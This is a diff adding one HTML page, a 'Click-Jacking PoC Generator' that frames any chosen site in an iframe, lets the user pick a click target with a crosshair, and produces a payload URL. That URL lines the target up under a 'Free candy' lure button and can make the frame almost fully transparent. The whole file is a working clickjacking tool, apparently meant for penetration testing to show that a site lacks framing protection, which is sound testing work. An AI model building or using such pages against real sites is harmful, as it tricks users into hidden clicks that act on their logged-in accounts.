@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🖱️</text></svg>">
+    <title>Click-Jacking PoC Generator</title>
+    <style>
+        * {
+            margin: 0px;
+            outline: none;
+            padding: 0px;
+        }
+
+        body {
+            border: 0px;
+            outline: none;
+            padding: 0px;
+            margin: 0px;
+            font-family: Tahoma, sans-serif;
+        }
+
+        iframe {
+            width: 2000px;
+            height: 2000px;
+            pointer-events: none;
+            padding: 0px;
+            outline: none;
+            border: 0px;
+        }
+
+        #lure {
+            position: fixed;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+            font-size: 22px;
+            z-index: 99999999;
+        }
+
+        #controls {
+            position: fixed;
+            top: 0px;
+            left: 0px;
+            width: 100vw;
+            padding: 15px;
+            z-index: 99999999;
+            background: rgba(199, 199, 199, 0.473);
+            display: flex;
+            flex-direction: row;
+            justify-content: space-around;
+            display: none;
+        }
+
+        .btn {
+            padding: 2px;
+            cursor: pointer;
+        }
+
+        #copypl {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="controls">
+        <form action="" id="fr-loader">
+            URL: <input required type="url" id="url-i" value="https://example.com">
+            <button class="btn">Load</button>
+        </form>
+        <div>
+            Hide lure button during generation
+            <input type="checkbox" name="shl" id="shl">
+        </div>
+        <div>
+            Hide frame in final payload
+            <input type="checkbox" name="hf" id="hf">
+        </div>
+        <button class="btn" id="copypl">Copy Payload URL</button>
+    </div>
+    <iframe id="frame" frameborder="0">
+    </iframe>
+    <button id="lure">🍬 Free candy 🍭 !!!</button>
+</body>
+<script>
+    function fallbackCopyTextToClipboard(text) {
+        var textArea = document.createElement("textarea");
+        textArea.value = text;
+
+        // Avoid scrolling to bottom
+        textArea.style.top = "0";
+        textArea.style.left = "0";
+        textArea.style.position = "fixed";
+
+        document.body.appendChild(textArea);
+        textArea.focus();
+        textArea.select();
+
+        try {
+            var successful = document.execCommand('copy');
+            var msg = successful ? 'successful' : 'unsuccessful';
+            console.log('Fallback: Copying text command was ' + msg);
+        } catch (err) {
+            console.error('Fallback: Oops, unable to copy', err);
+        }
+
+        document.body.removeChild(textArea);
+    }
+    function copyTextToClipboard(text) {
+        if (!navigator.clipboard) {
+            fallbackCopyTextToClipboard(text);
+            return;
+        }
+        navigator.clipboard.writeText(text).then(function () {
+            console.log('Async: Copying to clipboard was successful!');
+        }, function (err) {
+            console.error('Async: Could not copy text: ', err);
+        });
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+
+        let frame = document.getElementById("frame");
+
+        let controls = document.getElementById("controls");
+
+        const params = new URLSearchParams(document.location.search);
+
+        if (params.get("url") !== null) {
+            const url = params.get("url");
+            const x = parseInt(params.get("x"));
+            const y = parseInt(params.get("y"));
+            const hideFrame = params.get("h") == "true";
+
+            if (hideFrame) {
+                frame.style.opacity = '0.00000000001';
+            }
+
+            frame.src = url;
+
+            const resizer = (e) => {
+                let width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
+                let height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;
+                frame.style.top = `${parseInt(- y + (height / 2))}px`;
+                frame.style.left = `${parseInt(- x + (width / 2))}px`;
+            };
+
+            frame.style.position = 'absolute';
+            frame.style.pointerEvents = 'initial';
+            document.body.style.overflowX = 'hidden';
+            document.body.style.overflowY = 'hidden';
+
+            window.addEventListener('resize', resizer);
+
+            resizer({});
+
+        } else {
+
+            controls.style.display = 'flex';
+
+            let url = "";
+
+            let urlInput = document.getElementById("url-i");
+
+            document.getElementById("fr-loader").addEventListener("submit", (e) => {
+                e.preventDefault();
+                hideLure.disabled = false;
+                hideFramechbx.disabled = false;
+                copyPL.style.display = 'none';
+                frame.src = urlInput.value;
+            });
+
+            let copyPL = document.getElementById("copypl");
+
+            copyPL.addEventListener("click", () => {
+                copyTextToClipboard(url);
+            });
+
+            let hideLure = document.getElementById("shl");
+            let lure = document.getElementById("lure");
+
+            hideLure.addEventListener("change", (e) => {
+                if (hideLure.checked) {
+                    lure.style.display = 'none';
+                } else {
+                    lure.style.display = 'block';
+                }
+            });
+
+            let hideFramechbx = document.getElementById("hf");
+            let hideFrame = false;
+
+            hideFramechbx.addEventListener("change", (e) => {
+                hideFrame = hideFramechbx.checked;
+            });
+
+            let width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
+            let height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;
+
+            let xOffset, yOffset = 0;
+
+            let selected = false;
+
+            const posPick = (e) => {
+                window.removeEventListener('click', posPick);
+                frame.style.position = "absolute";
+                xOffset = e.pageX;
+                yOffset = e.pageY;
+                width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
+                height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;
+                frame.style.top = `${parseInt(- yOffset + (height / 2))}px`;
+                frame.style.left = `${parseInt(- xOffset + (width / 2))}px`;
+                frame.style.pointerEvents = `initial`;
+                document.body.style.overflowX = 'hidden';
+                document.body.style.overflowY = 'hidden';
+                selected = true;
+                controls.style.display = 'flex';
+                lure.style.display = 'block';
+                url = `${window.location.href}?url=${encodeURIComponent(frame.src)}&x=${xOffset}&y=${yOffset}&h=${hideFrame}`;
+                copyPL.style.display = 'block';
+                document.body.style.cursor = 'pointer';
+            };
+
+            frame.addEventListener("load", () => {
+                if (frame.src === "") {
+                    return;
+                }
+                controls.style.display = 'none';
+                document.body.style.cursor = 'crosshair';
+                hideLure.disabled = true;
+                hideFramechbx.disabled = true;
+                alert("Choose a click-jacking point using the crosshair");
+                window.addEventListener('click', posPick);
+            });
+
+            window.addEventListener('resize', (e) => {
+                if (selected) {
+                    width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
+                    height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;
+                    frame.style.top = `${parseInt(- yOffset + (height / 2))}px`;
+                    frame.style.left = `${parseInt(- xOffset + (width / 2))}px`;
+                }
+            });
+        }
+    });
+</script>
+
+</html>
